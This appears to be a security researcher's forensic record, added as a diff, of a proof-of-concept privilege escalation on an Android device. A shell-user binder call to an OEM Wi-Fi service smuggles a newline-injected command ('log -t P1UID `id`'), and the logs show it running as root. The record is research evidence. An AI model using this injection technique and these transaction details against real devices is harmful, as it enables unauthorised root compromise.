@@ -1,0 +1,29 @@
+# P1/L3 现场取证（设备 3b883b98，2026-11-18T04:07:13Z UTC）
+## 调用方
+uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
+
+## 载荷（字节）
+   x  \n   l   o   g       -   t       P   1   U   I   D       `
+   i   d   `
+
+## 事务
+BINDER=android.os.BinderProxy@3f607d9
+PAYLOAD_FILE=/data/local/tmp/_p1_payload2 bytes=19
+CODE=10070 TOKEN=android.net.wifi.IOplusWifiManager
+ARG len=19 cp=x\x0alog -t P1UID `id`
+TRANSACT=true
+REPLY size=8 hex=0000000001000000
+INT=1
+
+## logcat
+11-18 12:07:14.561 28543 28543 W app_process: type=1400 audit(0.0:14920): avc: denied { read } for name="u:object_r:vendor_mm_video_prop:s0" dev="tmpfs" ino=23621 scontext=u:r:shell:s0 tcontext=u:object_r:vendor_mm_video_prop:s0 tclass=file permissive=0
+11-18 12:07:14.571 28543 28543 W app_process: type=1400 audit(0.0:14921): avc: denied { read } for name="u:object_r:device_config_runtime_native_boot_prop:s0" dev="tmpfs" ino=23457 scontext=u:r:shell:s0 tcontext=u:object_r:device_config_runtime_native_boot_prop:s0 tclass=file permissive=0
+11-18 12:07:14.571 28543 28543 W app_process: type=1400 audit(0.0:14924): avc: denied { read } for name="u:object_r:device_config_runtime_native_boot_prop:s0" dev="tmpfs" ino=23457 scontext=u:r:shell:s0 tcontext=u:object_r:device_config_runtime_native_boot_prop:s0 tclass=file permissive=0
+11-18 12:07:14.742  1755  4874 D OplusWifiHalService: entering executeDriverCommand(x
+11-18 12:07:14.742  1755  4874 D OplusWifiHalService: log -t P1UID `id`)
+11-18 12:07:14.745  1755  4874 D OplusWifiHalService: executeDriverCommand(x
+11-18 12:07:14.745  1755  4874 D OplusWifiHalService: log -t P1UID `id`) completed successfully.
+11-18 12:07:14.745  1755  4874 D OplusWifiHalService: leaving executeDriverCommand(x
+11-18 12:07:14.745  1755  4874 D OplusWifiHalService: log -t P1UID `id`) with result =  
+11-18 12:07:14.834 28560 28560 I P1UID   : uid=0(root) gid=1010(wifi) groups=1010(wifi),1000(system),2901(vendor_qti_diag),3005(net_admin) context=u:r:oplus_wifi_service:s0
+11-18 12:07:14.831 18129 18129 W kworker/2:1: type=1400 audit(0.0:14925): avc: denied { write } for name="oplus_charge" dev="sda13" ino=1310808 scontext=u:r:kernel:s0 tcontext=u:object_r:system_data_file:s0 tclass=dir permissive=0
